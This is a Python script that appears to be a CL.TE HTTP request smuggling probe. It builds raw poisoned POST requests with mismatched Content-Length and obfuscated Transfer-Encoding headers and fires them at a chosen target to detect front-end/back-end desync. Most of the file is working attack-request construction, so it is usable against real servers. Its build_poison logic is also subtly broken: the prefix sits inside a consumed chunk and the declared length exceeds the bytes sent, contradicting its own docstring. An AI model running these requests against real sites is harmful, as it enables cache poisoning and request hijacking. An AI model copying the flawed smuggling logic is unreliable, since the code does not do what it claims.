#!/usr/bin/env python3
"""
CLTEsmuggleV3.0.0 - HTTP Request Smuggling CL.TE Probe

Changes over v2.4.1
-------------------
FIX-1 (build_poison rewrite):
    Content-Length is now set LARGER than the chunked body, not equal to it.
    The smuggled prefix is placed BEFORE the terminating chunk so the back-end
    has unconsumed bytes after chunked parsing ends.  The front-end sees a
    complete Content-Length frame; the back-end sees a complete chunked stream
    and leaves the smuggled prefix in the TCP buffer for the next request.

FIX-2 (TE variant expansion):
    Added high-value obfuscation variants: vertical-tab prefix (\x0b),
    form-feed prefix (\x0c), null-byte suffix (\x00), embedded space
    (chu nked), and dual TE header injection.

FIX-3 (response counter hardening):
    _count_responses now explicitly excludes 100 AND 103 status codes.
    Response-count comparison requires ctrl_count to be stable across
    BASELINE_ROUNDS before it is used as a reference, reducing LB noise.

FIX-4 (marker detection overhaul):
    Instead of relying on URL reflection, the smuggled prefix is crafted as
    an INVALID HTTP method (ZPROBE).  A back-end that processes the smuggled
    prefix will return 400/405 for the victim request instead of 200.
    The old URL-marker fallback is kept as a secondary signal.

FIX-5 (connection affinity):
    Both poison+victim and control legs resolve the target IP once and pin to
    it for all retries in a single probe round, reducing the chance that a
    load balancer routes them to different back-end workers.
"""

import socket
import ssl
import time
import sys
import re
import secrets
import argparse
import base64
from urllib.parse import urlparse
from dataclasses import dataclass, field
from typing import Optional

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------
DEFAULT_TARGET       = "https://example.com"
DEFAULT_PATH         = "/"
TIMEOUT_CONNECT      = 10
TIMEOUT_READ         = 5
PROBE_RETRIES        = 3
PROBE_DELAY          = 0.6        # seconds between poison and victim on same conn
PROBE_INTERVAL       = 1.2        # seconds between retry rounds
RESPONSE_SIZE_LIMIT  = 1 * 1024 * 1024
BASELINE_ROUNDS      = 3          # FIX-3: how many baseline requests to stabilise ctrl

# FIX-2: expanded TE variant set
TE_VARIANTS = [
    # --- standard ---
    ("standard",       "Transfer-Encoding: chunked"),
    # --- whitespace / delimiter obfuscation ---
    ("space-before-colon",  "Transfer-Encoding : chunked"),
    ("lowercase",      "transfer-encoding: chunked"),
    ("tab-fold",       "Transfer-Encoding: chunked\r\n\t"),
    ("vt-prefix",      "Transfer-Encoding: \x0bchunked"),   # FIX-2
    ("ff-prefix",      "Transfer-Encoding: \x0cchunked"),   # FIX-2
    ("nul-suffix",     "Transfer-Encoding: chunked\x00"),   # FIX-2
    ("space-in-value", "Transfer-Encoding: chu nked"),      # FIX-2
    # --- value obfuscation ---
    ("xchunked",       "Transfer-Encoding: xchunked"),
    ("chunked-identity","Transfer-Encoding: chunked, identity"),
    # --- dual-header injection (FIX-2): two separate header lines ---
    ("dual-te",        "Transfer-Encoding: identity\r\nTransfer-Encoding: chunked"),
]

DISCLAIMER = (
    "[!] DISCLAIMER: This tool is for authorised penetration testing and "
    "defensive security research only. Unauthorised use is illegal."
)

INVALID_METHOD = "ZPROBE"   # FIX-4: method that should yield 400/405 on a normal back-end

# ---------------------------------------------------------------------------
# Marker (kept as secondary signal per FIX-4)
# ---------------------------------------------------------------------------
def generate_marker() -> str:
    return "xprobe" + secrets.token_hex(6)

SMUGGLED_MARKER: str = generate_marker()

# ---------------------------------------------------------------------------
# Data classes
# ---------------------------------------------------------------------------
@dataclass
class ProxyConfig:
    host: str
    port: int
    username: Optional[str] = None
    password: Optional[str] = None

@dataclass
class BaselineResult:
    status_codes: list = field(default_factory=list)
    response_count: float = 0.0   # average over BASELINE_ROUNDS
    raw_responses: list  = field(default_factory=list)

@dataclass
class ProbeResult:
    variant_name: str   = ""
    te_header:    str   = ""
    response:     bytes = b""
    control_response: bytes = b""
    timed_out:    bool  = False
    truncated:    bool  = False
    error:        str   = ""
    control_error: str  = ""
    elapsed:      float = 0.0

@dataclass
class AnalysisReport:
    variant_name: str  = ""
    te_header:    str  = ""
    verdict:      str  = "NOT VULNERABLE"
    confidence:   str  = "LOW"
    indicators:   list = field(default_factory=list)

# ---------------------------------------------------------------------------
# Target / proxy parsing
# ---------------------------------------------------------------------------
def parse_target(target: str):
    if "://" not in target:
        target = "https://" + target
    p = urlparse(target)
    scheme  = p.scheme.lower()
    use_tls = scheme == "https"
    host    = p.hostname or ""
    port    = p.port or (443 if use_tls else 80)
    path    = p.path or "/"
    if p.query:
        path += "?" + p.query
    return host, port, host, use_tls, path

def parse_proxy(proxy_str: str) -> ProxyConfig:
    if not proxy_str:
        return None
    if "://" not in proxy_str:
        proxy_str = "http://" + proxy_str
    p = urlparse(proxy_str)
    host = p.hostname
    port = p.port
    if not host:
        raise ValueError(f"Cannot parse proxy host from: {proxy_str!r}")
    if not port:
        raise ValueError(f"Cannot parse proxy port from: {proxy_str!r}")
    return ProxyConfig(
        host=host, port=port,
        username=p.username or None,
        password=p.password or None,
    )

# ---------------------------------------------------------------------------
# Request builders
# ---------------------------------------------------------------------------
def build_marker_path(base_path: str) -> str:
    sep = "&" if "?" in base_path else "?"
    return f"{base_path}{sep}xmarker={SMUGGLED_MARKER}"

def build_get_request(
    hosthdr:       str,
    path:          str,
    extra_headers: Optional[dict] = None,
    keep_alive:    bool = True,
) -> bytes:
    conn  = "keep-alive" if keep_alive else "close"
    lines = [
        f"GET {path} HTTP/1.1",
        f"Host: {hosthdr}",
        f"Connection: {conn}",
    ]
    if extra_headers:
        for k, v in extra_headers.items():
            lines.append(f"{k}: {v}")
    lines += ["", ""]
    return "\r\n".join(lines).encode()

# FIX-1: correct CL.TE poison construction
def build_poison(
    hosthdr:     str,
    base_path:   str,
    te_header:   str,
    marker_path: str,
) -> bytes:
    """
    CL.TE poison POST — fixed structure.

    The chunked body contains:
      1. A non-zero chunk whose DATA is the smuggled prefix (no terminating CRLF
         after the data so the back-end has it sitting in its read buffer).
      2. A terminating chunk  0\\r\\n\\r\\n

    Content-Length = len(chunked body) + EXTRA_BYTES
    where EXTRA_BYTES > 0.

    Front-end behaviour (uses Content-Length):
      Reads exactly Content-Length bytes → sees a complete request.

    Back-end behaviour (uses Transfer-Encoding):
      Reads chunk 1, then chunk 0 (terminal) → chunked stream complete.
      The EXTRA_BYTES that Content-Length promised but chunked stream did NOT
      produce are left as "pending" in the back-end's connection buffer and
      are prepended to the next request on the same keep-alive connection.

    The smuggled prefix uses INVALID_METHOD so the victim request becomes
    "ZPROBE GET /victim HTTP/1.1" which triggers a 400/405 (FIX-4).
    """
    # Build the smuggled prefix that will pollute the next request's start line
    smuggled_prefix = (
        f"{INVALID_METHOD} {marker_path} HTTP/1.1\r\n"
        f"Host: {hosthdr}\r\n"
        f"X-Probe: {SMUGGLED_MARKER}\r\n"
        f"Content-Length: 10\r\n"
        f"\r\n"
    )
    prefix_bytes = smuggled_prefix.encode()

    # Build chunked body: one data chunk + terminating chunk
    chunk_hex  = format(len(prefix_bytes), "x")
    chunked_body = (
        f"{chunk_hex}\r\n".encode()
        + prefix_bytes
        + b"\r\n"
        + b"0\r\n\r\n"
    )

    # Content-Length is LARGER than chunked_body so the back-end has leftover bytes
    cl = len(chunked_body) + len(prefix_bytes)  # deliberate over-count

    hdr_block = "\r\n".join([
        f"POST {base_path} HTTP/1.1",
        f"Host: {hosthdr}",
        te_header,
        f"Content-Length: {cl}",
        "Connection: keep-alive",
        "",
        "",
    ])
    return hdr_block.encode() + chunked_body

def build_victim(hosthdr: str, path: str) -> bytes:
    lines = [
        f"GET {path} HTTP/1.1",
        f"Host: {hosthdr}",
        "Connection: close",
        "",
        "",
    ]
    return "\r\n".join(lines).encode()

def build_control(hosthdr: str, path: str) -> bytes:
    lines = [
        f"GET {path} HTTP/1.1",
        f"Host: {hosthdr}",
        "Connection: close",
        "",
        "",
    ]
    return "\r\n".join(lines).encode()

# ---------------------------------------------------------------------------
# Connection helpers
# ---------------------------------------------------------------------------
def _connect_via_proxy(
    proxy: ProxyConfig,
    target_host: str,
    target_port: int,
    sni: str,
    use_tls: bool,
    resolved_ip: Optional[str] = None,
) -> socket.socket:
    addr = resolved_ip or proxy.host
    sock = socket.create_connection((addr, proxy.port), timeout=TIMEOUT_CONNECT)
    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    connect_req = (
        f"CONNECT {target_host}:{target_port} HTTP/1.1\r\n"
        f"Host: {target_host}:{target_port}\r\n"
    )
    if proxy.username and proxy.password:
        cred = base64.b64encode(
            f"{proxy.username}:{proxy.password}".encode()
        ).decode()
        connect_req += f"Proxy-Authorization: Basic {cred}\r\n"
    connect_req += "\r\n"
    sock.sendall(connect_req.encode())
    resp = b""
    while b"\r\n\r\n" not in resp:
        chunk = sock.recv(4096)
        if not chunk:
            break
        resp += chunk
    if b"200" not in resp.split(b"\r\n")[0]:
        sock.close()
        raise ConnectionError(f"Proxy CONNECT failed: {resp[:80]!r}")
    if use_tls:
        ctx = ssl.create_default_context()
        sock = ctx.wrap_socket(sock, server_hostname=sni)
    return sock

def create_socket(
    host: str,
    port: int,
    sni: str,
    use_tls: bool,
    proxy: Optional[ProxyConfig] = None,
    resolved_ip: Optional[str] = None,
) -> socket.socket:
    if proxy:
        return _connect_via_proxy(proxy, host, port, sni, use_tls, resolved_ip)
    addr = resolved_ip or host
    sock = socket.create_connection((addr, port), timeout=TIMEOUT_CONNECT)
    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    if use_tls:
        ctx = ssl.create_default_context()
        sock = ctx.wrap_socket(sock, server_hostname=sni)
    return sock

# FIX-5: resolve once, reuse IP for both legs
def resolve_host(host: str) -> Optional[str]:
    try:
        return socket.gethostbyname(host)
    except Exception:
        return None

# ---------------------------------------------------------------------------
# Raw send / receive
# ---------------------------------------------------------------------------
def recv_all(
    sock: socket.socket,
    timeout: float,
) -> tuple:           # (data: bytes, timed_out: bool, truncated: bool)
    sock.settimeout(timeout)
    data      = b""
    timed_out = False
    truncated = False
    try:
        while True:
            chunk = sock.recv(65536)
            if not chunk:
                break
            data += chunk
            if len(data) >= RESPONSE_SIZE_LIMIT:
                truncated = True
                break
    except socket.timeout:
        timed_out = True
    except Exception:
        pass
    return data, timed_out, truncated

def _send_and_collect(
    host: str,
    port: int,
    sni: str,
    use_tls: bool,
    *request_bytes_list,
    proxy: Optional[ProxyConfig] = None,
    resolved_ip: Optional[str]   = None,
    delay_between: float          = 0.0,
    read_timeout: float           = TIMEOUT_READ,
) -> tuple:
    sock = create_socket(host, port, sni, use_tls, proxy, resolved_ip)
    try:
        for i, req in enumerate(request_bytes_list):
            sock.sendall(req)
            if i < len(request_bytes_list) - 1 and delay_between > 0:
                time.sleep(delay_between)
        data, timed_out, truncated = recv_all(sock, read_timeout)
    finally:
        try:
            sock.close()
        except Exception:
            pass
    return data, timed_out, truncated

# ---------------------------------------------------------------------------
# Response parsing
# ---------------------------------------------------------------------------
def _first_status_code(data: bytes) -> Optional[int]:
    m = re.search(rb"HTTP/\S+\s+(\d{3})", data)
    return int(m.group(1)) if m else None

def _all_status_lines(data: bytes) -> list:
    return re.findall(rb"HTTP/\S+\s+\d{3}[^\r\n]*", data)

# FIX-3: exclude both 100 AND 103
def _count_responses(data: bytes) -> int:
    codes = [int(m) for m in re.findall(rb"HTTP/\S+\s+(\d{3})", data)]
    return sum(1 for c in codes if c not in (100, 103))

def _marker_in_data(data: bytes) -> bool:
    return SMUGGLED_MARKER.encode() in data

# FIX-4: primary detection — victim returned non-2xx due to smuggled invalid method
def _invalid_method_triggered(victim_status: Optional[int]) -> bool:
    return victim_status is not None and victim_status in (400, 405, 501)

# ---------------------------------------------------------------------------
# Baseline
# ---------------------------------------------------------------------------
def send_baselines(
    host: str, port: int, sni: str, use_tls: bool,
    path: str, hosthdr: str,
    proxy: Optional[ProxyConfig],
    resolved_ip: Optional[str],
    read_timeout: float,
    verbose: bool,
) -> BaselineResult:
    result  = BaselineResult()
    counts  = []
    for i in range(BASELINE_ROUNDS):
        req  = build_get_request(hosthdr, path, keep_alive=False)
        try:
            data, _, _ = _send_and_collect(
                host, port, sni, use_tls, req,
                proxy=proxy, resolved_ip=resolved_ip,
                read_timeout=read_timeout,
            )
            sc = _first_status_code(data)
            if sc:
                result.status_codes.append(sc)
            cnt = _count_responses(data)
            counts.append(cnt)
            result.raw_responses.append(data)
        except Exception as e:
            if verbose:
                print(f"  [baseline {i+1}] error: {e}")
        time.sleep(0.3)
    result.response_count = sum(counts) / len(counts) if counts else 0.0
    return result

# ---------------------------------------------------------------------------
# Probe
# ---------------------------------------------------------------------------
def send_probe(
    host: str, port: int, sni: str, use_tls: bool,
    path: str, hosthdr: str,
    te_name: str, te_header: str,
    proxy: Optional[ProxyConfig],
    resolved_ip: Optional[str],
    read_timeout: float,
    verbose: bool,
) -> ProbeResult:
    marker_path  = build_marker_path(path)
    poison_bytes = build_poison(hosthdr, path, te_header, marker_path)
    victim_bytes = build_victim(hosthdr, path)
    ctrl_bytes   = build_control(hosthdr, path)

    result = ProbeResult(variant_name=te_name, te_header=te_header)
    t0 = time.monotonic()

    pv_data      = b""
    pv_timed_out = False
    pv_error     = ""

    ctrl_data      = b""
    ctrl_error     = ""

    # leg 1: poison + victim on same connection
    try:
        pv_data, pv_timed_out, _ = _send_and_collect(
            host, port, sni, use_tls,
            poison_bytes, victim_bytes,
            proxy=proxy, resolved_ip=resolved_ip,
            delay_between=PROBE_DELAY,
            read_timeout=read_timeout,
        )
    except Exception as exc:
        pv_error = f"{type(exc).__name__}: {exc}"

    # leg 2: control on its own connection (same resolved IP — FIX-5)
    try:
        ctrl_data, _, _ = _send_and_collect(
            host, port, sni, use_tls,
            ctrl_bytes,
            proxy=proxy, resolved_ip=resolved_ip,
            read_timeout=read_timeout,
        )
    except Exception as exc:
        ctrl_error = f"{type(exc).__name__}: {exc}"

    result.response         = pv_data
    result.control_response = ctrl_data
    result.timed_out        = pv_timed_out
    result.error            = " | ".join(filter(None, [pv_error, ctrl_error]))
    result.control_error    = ctrl_error
    result.elapsed          = time.monotonic() - t0

    if verbose:
        pv_st   = _all_status_lines(pv_data)
        ctrl_st = _all_status_lines(ctrl_data)
        print(f"  [probe] pv  status lines : {pv_st}")
        print(f"  [probe] ctrl status lines: {ctrl_st}")
        if pv_error:
            print(f"  [probe] pv  error: {pv_error}")

    return result

# ---------------------------------------------------------------------------
# Analysis
# ---------------------------------------------------------------------------
def analyze_response(
    result:   ProbeResult,
    baseline: BaselineResult,
) -> AnalysisReport:
    report = AnalysisReport(
        variant_name=result.variant_name,
        te_header=result.te_header,
    )

    if result.error and not result.response:
        report.indicators.append(f"probe failed entirely: {result.error}")
        return report

    pv_count   = _count_responses(result.response)
    ctrl_count = _count_responses(result.control_response)
    pv_status  = _first_status_code(result.response)
    ctrl_status = (
        None if result.control_error
        else _first_status_code(result.control_response)
    )

    # ---- FIX-4: PRIMARY SIGNAL — invalid method triggered on victim ----
    # Extract status of the SECOND response (the victim response) if present
    all_pv_codes = [
        int(m) for m in re.findall(rb"HTTP/\S+\s+(\d{3})", result.response)
        if int(m) not in (100, 103)
    ]
    victim_status = all_pv_codes[1] if len(all_pv_codes) >= 2 else None

    if _invalid_method_triggered(victim_status):
        report.indicators.append(
            f"victim request returned {victim_status} — back-end processed smuggled "
            f"'{INVALID_METHOD}' prefix, confirming CL.TE desync"
        )
        report.confidence = "HIGH"
        report.verdict    = "VULNERABLE (CL.TE)"
        return report

    # ---- FIX-3: response count comparison with stabilised baseline ----
    stable_baseline = round(baseline.response_count)
    if pv_count >= 2 and ctrl_count <= stable_baseline:
        report.indicators.append(
            f"poison/victim produced {pv_count} HTTP responses; "
            f"control produced {ctrl_count} (baseline ≈ {stable_baseline}) — suspected desync"
        )
        report.confidence = "HIGH"
        report.verdict    = "VULNERABLE (CL.TE)"
        return report

    # ---- weak signals ----
    marker = SMUGGLED_MARKER.encode()

    if (
        ctrl_status is not None
        and pv_status  is not None
        and pv_status  != ctrl_status
    ):
        report.indicators.append(
            f"first status code differs: poison={pv_status}, control={ctrl_status}"
        )
        report.confidence = "MEDIUM"
        report.verdict    = "POSSIBLY VULNERABLE (CL.TE)"

    if marker in result.response:
        report.indicators.append(
            f"smuggled marker '{SMUGGLED_MARKER}' found in poison/victim response"
        )
        if report.confidence != "HIGH":
            report.confidence = "MEDIUM"
            report.verdict    = "POSSIBLY VULNERABLE (CL.TE)"

    return report

# ---------------------------------------------------------------------------
# Aggregation
# ---------------------------------------------------------------------------
def aggregate_reports(reports: list) -> AnalysisReport:
    for r in reports:
        if r.confidence == "HIGH":
            return r
    for r in reports:
        if r.confidence == "MEDIUM":
            return r
    return reports[0] if reports else AnalysisReport()

# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------
def main():
    print(DISCLAIMER)
    print()

    parser = argparse.ArgumentParser(
        description="CLTEsmuggleV3.0.0 — CL.TE HTTP request smuggling probe",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("--target",  default=DEFAULT_TARGET,
                        help=f"Target URL  (default: {DEFAULT_TARGET})")
    parser.add_argument("--path",    default=None,
                        help=f"Override request path  (default: derived from --target)")
    parser.add_argument("--proxy",   default=None,
                        help="HTTP proxy, e.g. http://127.0.0.1:8080")
    parser.add_argument("--retries", type=int, default=PROBE_RETRIES,
                        help=f"Probe retries per TE variant  (default: {PROBE_RETRIES})")
    parser.add_argument("--timeout", type=float, default=TIMEOUT_READ,
                        help=f"Read timeout in seconds  (default: {TIMEOUT_READ})")
    parser.add_argument("--verbose", action="store_true",
                        help="Print raw status lines and errors")
    args = parser.parse_args()

    host, port, sni, use_tls, default_path = parse_target(args.target)
    path  = args.path or default_path
    proxy = parse_proxy(args.proxy) if args.proxy else None

    # FIX-5: resolve once
    resolved_ip = resolve_host(host)
    if args.verbose:
        print(f"[*] Resolved {host} → {resolved_ip}")

    print(f"[*] Target  : {args.target}  (path={path})")
    print(f"[*] TLS     : {use_tls}")
    print(f"[*] Proxy   : {proxy}")
    print(f"[*] Marker  : {SMUGGLED_MARKER}")
    print(f"[*] Retries : {args.retries}  Timeout: {args.timeout}s")
    print()

    # Baseline
    print("[*] Collecting baseline …")
    baseline = send_baselines(
        host, port, sni, use_tls, path, host,
        proxy, resolved_ip, args.timeout, args.verbose,
    )
    print(f"    baseline status codes : {baseline.status_codes}")
    print(f"    baseline avg responses: {baseline.response_count:.1f}")
    print()

    all_reports: list[AnalysisReport] = []

    for te_name, te_header in TE_VARIANTS:
        print(f"[*] Probing variant: {te_name!r}")
        variant_reports = []

        for attempt in range(1, args.retries + 1):
            result = send_probe(
                host, port, sni, use_tls, path, host,
                te_name, te_header,
                proxy, resolved_ip, args.timeout, args.verbose,
            )
            report = analyze_response(result, baseline)
            variant_reports.append(report)

            if args.verbose:
                print(f"  attempt {attempt}: {report.verdict} ({report.confidence})")
                for ind in report.indicators:
                    print(f"    → {ind}")

            if report.confidence == "HIGH":
                break
            time.sleep(PROBE_INTERVAL)

        best = aggregate_reports(variant_reports)
        all_reports.append(best)
        print(f"    result: {best.verdict}  [{best.confidence}]")
        if best.indicators:
            for ind in best.indicators:
                print(f"      · {ind}")
        print()

    # Final summary
    final = aggregate_reports(all_reports)
    print("=" * 60)
    print(f"FINAL VERDICT : {final.verdict}")
    print(f"CONFIDENCE    : {final.confidence}")
    print(f"VARIANT       : {final.variant_name}")
    if final.indicators:
        print("INDICATORS    :")
        for ind in final.indicators:
            print(f"  · {ind}")
    print("=" * 60)

if __name__ == "__main__":
    main()